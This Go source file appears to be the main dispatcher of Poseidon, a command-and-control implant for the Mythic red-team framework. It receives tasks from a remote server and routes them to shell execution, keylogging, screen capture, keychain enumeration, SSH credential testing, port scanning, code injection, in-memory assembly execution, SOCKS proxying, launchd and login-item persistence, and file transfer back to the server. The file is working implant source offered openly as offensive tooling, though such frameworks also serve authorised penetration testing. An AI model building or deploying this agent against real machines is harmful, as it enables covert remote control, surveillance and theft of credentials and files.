package main

import (
	"C"

	// Standard
	"encoding/json"
	"fmt"
	"net"
	"sort"
	"sync"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cat"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/cp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/curl"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/download"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/drives"
	dyldinject "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/dyld_inject"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_assembly"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/execute_memory"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/getuser"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/inject_assembly"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jsimport_call"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/jxa"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keylog"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/keys"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/kill"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/libinject"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/list_entitlements"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/listtasks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_loginitem"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/portscan"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pwd"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/rm"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/screencapture"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/setenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/shell"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/socks"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sshauth"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/triagedirectory"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unsetenv"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
)
import (
	"encoding/binary"
	"os"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/link_tcp"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/sleep"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/unlink_tcp"
)

const (
	NONE_CODE = 100
	EXIT_CODE = 0
)

// list of currently running tasks
var runningTasks = make(map[string](structs.Task))
var mu sync.Mutex

// channel processes new tasking for this agent
var newTaskChannel = make(chan structs.Task, 10)

// channel processes responses that should go out and directs them towards the egress direction
var newResponseChannel = make(chan structs.Response, 10)
var newDelegatesToMythicChannel = make(chan structs.DelegateMessage, 10)
var P2PConnectionMessageChannel = make(chan structs.P2PConnectionMessage, 10)

// Mapping of command names to integers
var tasktypes = map[string]int{
	"exit":              EXIT_CODE,
	"shell":             1,
	"screencapture":     2,
	"keylog":            3,
	"download":          4,
	"upload":            5,
	"libinject":         6,
	"ps":                8,
	"sleep":             9,
	"cat":               10,
	"cd":                11,
	"ls":                12,
	"python":            13,
	"jxa":               14,
	"keys":              15,
	"triagedirectory":   16,
	"sshauth":           17,
	"portscan":          18,
	"jobs":              21,
	"jobkill":           22,
	"cp":                23,
	"drives":            24,
	"getuser":           25,
	"mkdir":             26,
	"mv":                27,
	"pwd":               28,
	"rm":                29,
	"getenv":            30,
	"setenv":            31,
	"unsetenv":          32,
	"kill":              33,
	"curl":              34,
	"xpc":               35,
	"socks":             36,
	"listtasks":         37,
	"list_entitlements": 38,
	"execute_memory":    39,
	"jsimport":          40,
	"jsimport_call":     41,
	"persist_launchd":   42,
	"persist_loginitem": 43,
	"dyld_inject":       44,
	"link_tcp":          45,
	"unlink_tcp":        46,
	"inject-assembly":   47,
	"execute-assembly":  48,
	"none":              NONE_CODE,
}

// define a new instance of an egress profile and P2P profile
var profile = profiles.New()

// Map used to handle go routines that are waiting for a response from apfell to continue
var storedFiles = make(map[string]([]byte))

var sendFilesToMythicChannel = make(chan structs.SendFileToMythicStruct, 10)
var getFilesFromMythicChannel = make(chan structs.GetFileFromMythicStruct, 10)

//export RunMain
func RunMain() {
	main()
}

// go routine that listens for messages that should go to Mythic for sending files to Mythic
// get things ready to transfer a file from Poseidon -> Mythic
func sendFileToMythic() {
	for {
		select {
		case fileToMythic := <-sendFilesToMythicChannel:
			fileToMythic.TrackingUUID = profiles.GenerateSessionID()
			fileToMythic.FileTransferResponse = make(chan json.RawMessage)
			fileToMythic.Task.Job.FileTransfers[fileToMythic.TrackingUUID] = fileToMythic.FileTransferResponse
			go profiles.SendFile(fileToMythic)
		}
	}
}

// go routine that listens for messages that should go to Mythic for getting files from Mythic
// get things ready to transfer a file from Mythic -> Poseidon
func getFileFromMythic() {
	for {
		select {
		case getFile := <-getFilesFromMythicChannel:
			getFile.TrackingUUID = profiles.GenerateSessionID()
			getFile.FileTransferResponse = make(chan json.RawMessage)
			getFile.Task.Job.FileTransfers[getFile.TrackingUUID] = getFile.FileTransferResponse
			go profiles.GetFile(getFile)
		}
	}
}

// save a file to memory for easy access later
func saveFile(fileUUID string, data []byte) {
	storedFiles[fileUUID] = data
}

// remove saved file from memory
func removeSavedFile(fileUUID string) {
	delete(storedFiles, fileUUID)
}

// get a saved file from memory
func getSavedFile(fileUUID string) []byte {
	if data, ok := storedFiles[fileUUID]; ok {
		return data
	} else {
		return nil
	}
}

func handleInboundMythicMessageFromEgressP2PChannel() {
	for {
		//fmt.Printf("looping to see if there's messages in the profiles.HandleInboundMythicMessageFromEgressP2PChannel\n")
		select {
		case message := <-profiles.HandleInboundMythicMessageFromEgressP2PChannel:
			//fmt.Printf("Got message from HandleInboundMythicMessageFromEgressP2PChannel\n")
			go handleMythicMessageResponse(message)
		}
	}
}

// Handle responses from mythic from post_response
func handleMythicMessageResponse(mythicMessage structs.MythicMessageResponse) {
	// Handle the response from apfell
	//fmt.Printf("handleMythicMessageResponse:\n%v\n", mythicMessage)
	// loop through each response and check to see if the file_id or task_id matches any existing background tasks
	for i := 0; i < len(mythicMessage.Responses); i++ {
		var r map[string]interface{}
		err := json.Unmarshal([]byte(mythicMessage.Responses[i]), &r)
		if err != nil {
			//log.Printf("Error unmarshal response to task response: %s", err.Error())
			break
		}

		//log.Printf("Handling response from apfell: %+v\n", r)
		if taskid, ok := r["task_id"]; ok {
			if task, exists := runningTasks[taskid.(string)]; exists {
				// send data to the channel
				if exists {
					raw, _ := json.Marshal(r)
					if trackingUUID, ok := r["tracking_uuid"]; ok {
						if fileTransfer, exists := task.Job.FileTransfers[trackingUUID.(string)]; exists {
							go func() {
								fileTransfer <- raw
							}()
							continue
						}
					}
					go func() {
						task.Job.ReceiveResponses <- raw
					}()
					continue
				}
			}
		}
	}
	// loop through each socks message and send it off
	for j := 0; j < len(mythicMessage.Socks); j++ {
		profiles.FromMythicSocksChannel <- mythicMessage.Socks[j]
	}
	// sort the Tasks
	sort.Slice(mythicMessage.Tasks, func(i, j int) bool {
		return mythicMessage.Tasks[i].Timestamp < mythicMessage.Tasks[j].Timestamp
	})
	// for each task, give it the appropriate Job information and send it on its way for processing
	for j := 0; j < len(mythicMessage.Tasks); j++ {
		job := &structs.Job{
			Stop:                               new(int),
			ReceiveResponses:                   make(chan json.RawMessage, 10),
			SendResponses:                      newResponseChannel,
			SendFileToMythic:                   sendFilesToMythicChannel,
			FileTransfers:                      make(map[string](chan json.RawMessage)),
			GetFileFromMythic:                  getFilesFromMythicChannel,
			SaveFileFunc:                       saveFile,
			RemoveSavedFile:                    removeSavedFile,
			GetSavedFile:                       getSavedFile,
			AddNewInternalTCPConnectionChannel: profiles.AddNewInternalTCPConnectionChannel,
			RemoveInternalTCPConnectionChannel: profiles.RemoveInternalTCPConnectionChannel,
			C2:                                 profile,
		}
		mythicMessage.Tasks[j].Job = job
		runningTasks[mythicMessage.Tasks[j].TaskID] = mythicMessage.Tasks[j]
		newTaskChannel <- mythicMessage.Tasks[j]
	}
	// loop through each delegate and try to forward it along
	if len(mythicMessage.Delegates) > 0 {
		profiles.HandleDelegateMessageForInternalTCPConnections(mythicMessage.Delegates)
	}
	return
}

// gather the responses from the task go routines into a central location
func aggregateResponses() {
	for {
		select {
		case response := <-newResponseChannel:
			marshalledResponse, err := json.Marshal(response)
			if err != nil {

			} else {
				if response.Completed {
					// We need to remove this job from our list of jobs
					delete(runningTasks, response.TaskID)
				}
				mu.Lock()
				profiles.TaskResponses = append(profiles.TaskResponses, marshalledResponse)
				mu.Unlock()
			}

		}
	}
}

// gather the delegate messages that need to go out the egress channel into a central location
func aggregateDelegateMessagesToMythic() {
	for {
		select {
		case response := <-newDelegatesToMythicChannel:
			mu.Lock()
			profiles.DelegateResponses = append(profiles.DelegateResponses, response)
			mu.Unlock()
		}
	}
}

// gather the edge notifications that need to go out the egress channel
func aggregateEdgeAnnouncementsToMythic() {
	for {
		select {
		case response := <-P2PConnectionMessageChannel:
			mu.Lock()
			profiles.P2PConnectionMessages = append(profiles.P2PConnectionMessages, response)
			mu.Unlock()
		}
	}
}

// process new tasking and call their go routines
func handleNewTask() {
	for {
		select {
		case task := <-newTaskChannel:
			//fmt.Printf("Handling new task: %v\n", task)
			switch tasktypes[task.Command] {
			case EXIT_CODE:
				os.Exit(0)
				break
			case 1:
				// Run shell command
				go shell.Run(task)
				break
			case 2:
				go screencapture.Run(task)
				break
			case 3:
				go keylog.Run(task)
				break
			case 4:
				go download.Run(task)
				break
			case 5:
				go upload.Run(task)
				break
			case 6:
				go libinject.Run(task)
				break
			case 8:
				go ps.Run(task)
				break
			case 9:
				// Sleep
				go sleep.Run(task)
				break
			case 10:
				//Cat a file
				go cat.Run(task)
				break
			case 11:
				//Change cwd
				go cd.Run(task)
				break
			case 12:
				//List directory contents
				go ls.Run(task)
				break
			case 14:
				//Execute jxa code in memory
				go jxa.Run(task)
				break
			case 15:
				// Enumerate keyring data for linux or the keychain for macos
				go keys.Run(task)
				break
			case 16:
				// Triage a directory and organize files by type
				go triagedirectory.Run(task)
				break
			case 17:
				// Test credentials against remote hosts
				go sshauth.Run(task)
				break
			case 18:
				// Scan ports on remote hosts.
				go portscan.Run(task)
				break
			case 21:
				// Return the list of jobs.
				go getJobListing(task)
				break
			case 22:
				// Kill the job
				go killJob(task)
				break
			case 23:
				go cp.Run(task)
				break
			case 24:
				// List drives on a machine
				go drives.Run(task)
				break
			case 25:
				// Retrieve information about the current user.
				go getuser.Run(task)
				break
			case 26:
				// Make a directory
				go mkdir.Run(task)
				break
			case 27:
				// Move files
				go mv.Run(task)
				break
			case 28:
				// Print working directory
				go pwd.Run(task)
				break
			case 29:
				go rm.Run(task)
				break
			case 30:
				go getenv.Run(task)
				break
			case 31:
				go setenv.Run(task)
				break
			case 32:
				go unsetenv.Run(task)
				break
			case 33:
				go kill.Run(task)
				break
			case 34:
				go curl.Run(task)
				break
			case 35:
				go xpc.Run(task)
				break
			case 36:
				go socks.Run(task)
				break
			case 37:
				go listtasks.Run(task)
				break
			case 38:
				go list_entitlements.Run(task)
				break
			case 39:
				go execute_memory.Run(task)
				break
			case 40:
				go jsimport.Run(task)
				break
			case 41:
				//Execute jxa code in memory from the script imported by jsimport
				go jsimport_call.Run(task)
				break
			case 42:
				//Execute persist_launch command to install launchd persistence
				go persist_launchd.Run(task)
				break
			case 43:
				// Execute persist_loginitem command to install login item persistence
				go persist_loginitem.Run(task)
				break
			case 44:
				// Execute spawn_libinject command to spawn a target application/binary with the DYLD_INSERT_LIBRARIES variable set to an arbitrary dylib
				go dyldinject.Run(task)
				break
			case 45:
				go link_tcp.Run(task)
				break
			case 46:
				go unlink_tcp.Run(task)
				break
			case 47:
				go inject_assembly.Run(task)
				break
			case 48:
				go execute_assembly.Run(task)
			case NONE_CODE:
				// No tasks, do nothing
				break
			}
			break
		}
	}
}

func getJobListing(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	msg.Completed = true
	// For graceful error handling server-side when zero jobs are processing.
	if len(runningTasks) == 0 {

		msg.UserOutput = "0 jobs"
	} else {
		var jobList []structs.TaskStub
		for _, x := range runningTasks {
			jobList = append(jobList, x.ToStub())
		}
		jsonSlices, err := json.MarshalIndent(jobList, "", "	")
		if err != nil {
			msg.UserOutput = err.Error()
			msg.Status = "error"
		} else {
			msg.UserOutput = string(jsonSlices)
		}

	}
	task.Job.SendResponses <- msg
}

func killJob(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	foundTask := false
	for _, taskItem := range runningTasks {
		if taskItem.TaskID == task.Params {
			*taskItem.Job.Stop = 1
			foundTask = true
			break
		}
	}

	if foundTask {
		msg.UserOutput = fmt.Sprintf("Sent kill signal to Job ID: %s", task.Params)
		msg.Completed = true
	} else {
		msg.UserOutput = fmt.Sprintf("No job with ID: %s", task.Params)
		msg.Completed = true
	}
	task.Job.SendResponses <- msg
}

// Tasks send a new net.Conn object to the task.Job.AddNewInternalConnectionChannel for poseidon to track
func handleAddNewInternalTCPConnections() {
	for {
		select {
		case newConnection := <-profiles.AddNewInternalTCPConnectionChannel:
			//fmt.Printf("handleNewInternalTCPConnections message from channel for %v\n", newConnection)
			newUUID := profiles.AddNewInternalTCPConnection(newConnection)
			go readFromInternalTCPConnections(newConnection, newUUID)
		}
	}
}

func readFromInternalTCPConnections(newConnection net.Conn, tempConnectionUUID string) {
	// read from the internal connections to pass back out to Mythic
	//fmt.Printf("readFromInternalTCPConnection started for %v\n", newConnection)
	var sizeBuffer uint32
	for {
		err := binary.Read(newConnection, binary.BigEndian, &sizeBuffer)
		if err != nil {
			fmt.Println("Failed to read size from tcp connection:", err)
			profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
			return
		}
		if sizeBuffer > 0 {
			readBuffer := make([]byte, sizeBuffer)

			readSoFar, err := newConnection.Read(readBuffer)
			if err != nil {
				fmt.Println("Failed to read bytes from tcp connection:", err)
				profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
				return
			}
			totalRead := uint32(readSoFar)
			for totalRead < sizeBuffer {
				// we didn't read the full size of the message yet, read more
				nextBuffer := make([]byte, sizeBuffer-totalRead)
				readSoFar, err = newConnection.Read(nextBuffer)
				if err != nil {
					fmt.Println("Failed to read bytes from tcp connection:", err)
					profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
					return
				}
				copy(readBuffer[totalRead:], nextBuffer)
				totalRead = totalRead + uint32(readSoFar)
			}
			//fmt.Printf("Read %d bytes from connection\n", totalRead)
			newDelegateMessage := structs.DelegateMessage{}
			newDelegateMessage.Message = string(readBuffer)
			newDelegateMessage.UUID = profiles.GetInternalConnectionUUID(tempConnectionUUID)
			newDelegateMessage.C2ProfileName = "poseidon_tcp"
			//fmt.Printf("Adding delegate message to channel: %v\n", newDelegateMessage)
			newDelegatesToMythicChannel <- newDelegateMessage
		} else {
			//fmt.Print("Read 0 bytes from internal TCP connection\n")
			profiles.RemoveInternalTCPConnectionChannel <- tempConnectionUUID
		}

	}

}

func handleRemoveInternalTCPConnections() {
	for {
		select {
		case removeConnection := <-profiles.RemoveInternalTCPConnectionChannel:
			//fmt.Printf("handleRemoveInternalTCPConnections message from channel for %v\n", removeConnection)
			successfullyRemovedConnection := false
			removalMessage := structs.P2PConnectionMessage{Action: "remove", C2ProfileName: "poseidon_tcp", Destination: removeConnection, Source: profiles.GetMythicID()}
			successfullyRemovedConnection = profiles.RemoveInternalTCPConnection(removeConnection)
			if successfullyRemovedConnection {
				P2PConnectionMessageChannel <- removalMessage
			}
		}
	}
}

func main() {
	// Initialize the  agent and check in
	go aggregateResponses()
	go aggregateDelegateMessagesToMythic()
	go aggregateEdgeAnnouncementsToMythic()
	go handleNewTask()
	go sendFileToMythic()
	go getFileFromMythic()
	go handleAddNewInternalTCPConnections()
	go handleRemoveInternalTCPConnections()
	go handleInboundMythicMessageFromEgressP2PChannel()
	profile.Start()
}
